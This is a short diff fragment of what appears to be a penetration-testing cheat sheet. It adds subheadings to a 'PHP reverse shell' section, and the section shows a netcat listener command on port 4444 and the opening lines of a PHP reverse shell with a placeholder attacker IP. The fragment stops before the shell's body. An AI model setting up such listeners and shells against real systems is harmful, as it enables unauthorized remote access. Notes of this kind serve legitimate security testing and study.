@@ -48,9 +48,11 @@ exploit
 ```
 
 ## PHP reverse shell
+### Listener
 ```bash
 nc -lvnp 4444
 ```
+### File
 ```php
 <?php
 $ip = 'x.x.x.x'; // change this to your IP address
